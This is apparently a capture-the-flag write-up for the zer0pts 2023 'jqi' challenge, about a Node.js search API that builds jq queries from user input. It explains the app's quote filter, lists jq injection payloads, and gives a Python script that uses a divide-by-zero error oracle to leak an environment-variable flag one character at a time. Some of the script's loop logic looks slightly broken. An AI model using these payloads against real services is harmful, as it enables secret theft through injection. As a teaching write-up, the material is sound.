+ JQ: JSON Queries
+ JQI: JQ injection
+ In this chall we need to abuse the weird functionality of jq injection
+ What `index.js` does?
    - An array KEYS is defined, containing keys that can be used in queries.
    - A route is defined to handle HTTP GET requests to the "/api/search" endpoint. This endpoint is used for performing JSON queries.
    - The query parameters keys and conds are parsed from the request's query string. If not present, default values are used.
    - If the number of keys or conds exceeds 10, an error response is sent back.
    - The script validates the specified keys and constructs a query for selecting specific keys from the JSON data.
    - The keysQuery variable is built by mapping the keys and creating a query string like name:.name,tags:.tags,....
    - For each condition, the script checks if the specified key is valid and then constructs a query that filters results using the select function. The condsQuery string is constructed by concatenating the filtering queries.
    - he jq.run function is used to execute the constructed query on the JSON data stored in the data.json file.The result is returned as a JSON object.
 
+ So, the webpage is basically the old archived challenges from zeropts 2022
```
 let condsQuery = '';

    for (const cond of conds) {
        const [str, key] = cond.split(' in ');
        if (!KEYS.includes(key)) {
            return reply.send({ error: 'invalid key' });
        }

        // check if the query is trying to break string literal
        if (str.includes('"') || str.includes('\\(')) {
            return reply.send({ error: 'hacking attempt detected' });
        }

        condsQuery += `| select(.${key} | contains("${str}"))`;
```
The code checks whether the str part of the condition contains potentially malicious content that might try to break out of the string literal or inject special characters.
The condition (str.includes('"') || str.includes('\\(')) checks if the string contains either a double quote (") or a backslash followed by an open parenthesis (\\(). These characters are often used in attempts to perform string manipulation or injection attacks.
Assuming the key and str are both valid and not attempting to perform a hack, the code constructs a partial jq query that will filter the JSON data based on the condition.
The format of the partial query is: | select(.key | contains("str")).
+ Payloads:
- \ in name
- ))]|123# in name

+ if conditions are given by a user, the app prints a sorry, you cannot use filters in demo versionand doesn't give us the result of the query. this as an oracle like Error-based SQL injection like getting an information if a condition is met, for example, the first character of the flag is zor not
+ You can use zero division to do Error-based jq injection like the below. Setting a divisor to a condition like if env.FLAG[0:1] == "z" then 0 else 1 endthat you want to know it is met or not, if the first character of env.FLAGis z, then error occurs because a dividend is divided by 0

```
import requests

HOST = 'http://jqi.2023.zer0pts.com:8300'

def  query (i, c):
    r = requests.get(f '{HOST}/api/search' , params={
         'keys' : 'name,author' ,
         'conds' : ',' .join(x for x in [
             ' \\ in name ' ,
            f '))]|env.FLAG[{i}:{i+1}]as$c|([{c}]|implode|1/(if($c==.)then(0)else( 1)end))# in name'
        ])
    })
    return  'something'  in r.json()[ 'error' ]

i = 0 
flag = '' 
while  not flag.endswith( '}' ):
     for c in  range ( 0x20 , 0x7f ):
         if query(i, c):
            flag += chr (c)
             continue 
    print (i, flag)
    i+= 1
```
This makes characters like [123]|implodeand checks those characters are same as the nth character of the flag.By repeating this, it steals the flag character by character.
